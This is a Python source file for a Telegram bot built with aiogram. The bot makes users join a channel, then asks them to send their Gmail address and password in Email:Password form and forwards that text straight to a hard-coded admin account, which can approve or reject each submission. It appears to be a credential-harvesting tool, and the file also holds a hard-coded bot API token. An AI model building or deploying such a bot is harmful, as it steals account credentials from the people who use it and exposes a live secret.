import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils.exceptions import ChatNotFound, UserDeactivated

# Your API Token, Channel, and Admin ID
API_TOKEN = '8924995974:AAEKVpB992nDx3oVhvIbwD4601F-ZHHqQJA'
CHANNEL_USERNAME = '@A_ToolsX'
ADMIN_ID = 5582627293

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Function to check channel membership
async def is_user_joined(user_id: int) -> bool:
    try:
        chat_member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        # Allows 'member', 'administrator', or 'creator' to pass (Fixes infinite loop)
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"Error checking channel status: {e}")
        return False

# Function to generate force join buttons
def get_force_join_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    btn_join = InlineKeyboardButton("🚀 JOIN CHANNEL", url=f"https://t.me/{CHANNEL_USERNAME.strip('@')}")
    btn_check = InlineKeyboardButton("🔄 Check / Refresh", callback_data="check_join")
    markup.add(btn_join, btn_check)
    return markup

# Main Menu Keyboard
def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(KeyboardButton("Balance 💰"), KeyboardButton("My account 👤"))
    markup.row(KeyboardButton("Submit Gmail 📧"))
    return markup

# /start Command Handler
@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    user_id = message.from_user.id
    
    if not await is_user_joined(user_id):
        await message.answer(
            "🚀 To use this bot, you must join our channel:\nEverything you need in one place. ⚡\n\nPlease join the channel and click 'Check / Refresh' below.",
            reply_markup=get_force_join_markup()
        )
        return

    await message.answer("Welcome! The main menu is now active.", reply_markup=get_main_menu())

# Callback Handler for Refresh Button
@dp.callback_query_handler(lambda c: c.data == 'check_join')
async def process_check_join(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    
    if await is_user_joined(user_id):
        await bot.delete_message(callback_query.message.chat.id, callback_query.message.message_id)
        await bot.answer_callback_query(callback_query.id, "Thank you! You have successfully joined.")
        await bot.send_message(callback_query.message.chat.id, "Main menu activated. Choose an option:", reply_markup=get_main_menu())
    else:
        await bot.answer_callback_query(callback_query.id, "❌ You haven't joined yet! Please join the channel first.", show_alert=True)

# Handling Text Messages (Menu Actions)
@dp.message_handler(lambda message: message.text in ["Balance 💰", "My account 👤", "Submit Gmail 📧"])
async def handle_menu(message: types.Message):
    user_id = message.from_user.id
    
    if not await is_user_joined(user_id):
        await message.answer("🚀 To use this bot, you must join our channel first.", reply_markup=get_force_join_markup())
        return

    if message.text == "Balance 💰":
        await message.answer("💵 Current Balance: $0.00")
    elif message.text == "My account 👤":
        await message.answer(f"👤 Account ID: {user_id}\nStatus: Active")
    elif message.text == "Submit Gmail 📧":
        await message.answer("Please reply to this message or type your Gmail and Password in this format (Email:Password):")
        # Directs to step handler for processing submission
        dp.register_message_handler(process_gmail_submission, user_id=user_id)

# Handler to process Gmail and send to your Admin ID
async def process_gmail_submission(message: types.Message):
    user_id = message.from_user.id
    gmail_data = message.text
    
    # Remove the temporary handler
    dp.message_handlers.unregister(process_gmail_submission)
    
    await message.answer("⏳ Your data has been submitted. Please wait for Admin approval.", reply_markup=get_main_menu())
    
    # Admin inline buttons
    admin_markup = InlineKeyboardMarkup(row_width=2)
    btn_approve = InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")
    btn_reject = InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
    admin_markup.add(btn_approve, btn_reject)
    
    admin_text = (
        "📥 **New Gmail Submission!**\n\n"
        f"👤 User ID: `{user_id}`\n"
        f"📝 Data: `{gmail_data}`\n\n"
        "Click below to Approve or Reject this request."
    )
    
    try:
        # Sends notification directly to your ID: 5582627293
        await bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode="Markdown", reply_markup=admin_markup)
    except Exception as e:
        print(f"Failed to send notification to Admin. Error: {e}")

# Admin Actions (Approve / Reject)
@dp.callback_query_handler(lambda c: c.data.startswith(('approve_', 'reject_')))
async def process_admin_action(callback_query: types.CallbackQuery):
    action, target_user_id = callback_query.data.split('_')
    
    if callback_query.from_user.id != ADMIN_ID:
        await bot.answer_callback_query(callback_query.id, "❌ You are not authorized to use this admin panel!", show_alert=True)
        return
        
    if action == 'approve':
        await bot.edit_message_text(text="✅ You have Approved this request.", chat_id=ADMIN_ID, message_id=callback_query.message.message_id)
        try:
            await bot.send_message(target_user_id, "🎉 Congratulations! Your submitted Gmail has been approved by the admin.")
        except Exception:
            pass
    elif action == 'reject':
        await bot.edit_message_text(text="❌ You have Rejected this request.", chat_id=ADMIN_ID, message_id=callback_query.message.message_id)
        try:
            await bot.send_message(target_user_id, "❌ Sorry! Your submitted Gmail has been rejected by the admin.")
        except Exception:
            pass

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
                               
